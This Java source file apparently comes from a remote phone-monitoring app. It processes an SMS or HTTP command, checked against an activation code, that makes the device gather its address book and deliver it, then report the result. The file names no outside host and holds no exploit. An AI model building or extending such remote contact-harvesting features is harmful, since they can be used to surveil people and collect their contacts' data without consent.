package com.vvt.remotecommandmanager.processor.addressbook;

import java.util.concurrent.CountDownLatch;

import com.vvt.appcontext.AppContext;
import com.vvt.daemon_addressbook_manager.AddressbookDeliveryListener;
import com.vvt.daemon_addressbook_manager.AddressbookManager;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;

public class SyncAddressBookProcessor extends RemoteCommandProcessor {
	private static final String TAG = "SyncAddressBookProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private AddressbookManager mAddressbookManager;
	private String mRecipientNumber;
	private CountDownLatch waitForResponseLatch;
	private ProcessingResult mReplyMessage;
	private LicenseInfo mLicenseInfo;
	private StringBuilder mReplyMessageBuilder;
	
	public SyncAddressBookProcessor(AppContext appContext,
			FxEventRepository eventRepository,
			LicenseInfo licenseInfo, 
			AddressbookManager addressbookManager) {
		
		super(appContext,eventRepository);
		
		mLicenseInfo = licenseInfo;
		mAddressbookManager = addressbookManager;
		mReplyMessage = new ProcessingResult();
	}
	

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.ASYNC_HTTP;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER...");
		mReplyMessageBuilder = new StringBuilder();
		
		waitForResponseLatch = new CountDownLatch(1);
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		try {
			if(LOGD) FxLog.d(TAG, "doProcessCommand # getAddressbook ...");
			mAddressbookManager.getAddressbook(mAddressbookDeliveryListener);
			
			//Block the thread and wait till onSuccess or onError called.
			try { waitForResponseLatch.await(); } catch (InterruptedException e) {
				if(LOGE) FxLog.e(TAG, e.getMessage());
			}
			
		} catch (FxNullNotAllowedException e) {
			if(LOGE) FxLog.e(TAG, e.getMessage());
			
			mReplyMessageBuilder.append(MessageManager.SYNC_ADDRESSBOOK_ERROR);
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT...");
		
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() != 1) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}

	AddressbookDeliveryListener mAddressbookDeliveryListener = new AddressbookDeliveryListener() {
		@Override
		public void onSuccess() {
			if(LOGV) FxLog.v(TAG, "onSuccess # ENTER...");
			mReplyMessageBuilder.append(MessageManager.SYNC_ADDRESSBOOK_COMPLETE);
			mReplyMessage.setIsSuccess(true);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			
			if(LOGD) FxLog.d(TAG, "onSuccess # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onSuccess # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onSuccess # EXIT...");
			waitForResponseLatch.countDown();
		} 
		
		@Override
		public void onError(int errorCode, String error) {
			if(LOGV) FxLog.v(TAG, "onError # ENTER...");
			mReplyMessageBuilder.append(MessageManager.getErrorMessage(errorCode));
			mReplyMessage.setIsSuccess(false);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			
			if(LOGD) FxLog.d(TAG, "onError # IsSuccess : " + mReplyMessage.isSuccess());
			if(LOGD) FxLog.d(TAG, "onError # ReplyMessage : " + mReplyMessage.getMessage());
			if(LOGV) FxLog.v(TAG, "onError # EXIT...");
			waitForResponseLatch.countDown();
			
		}
	};

	
	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
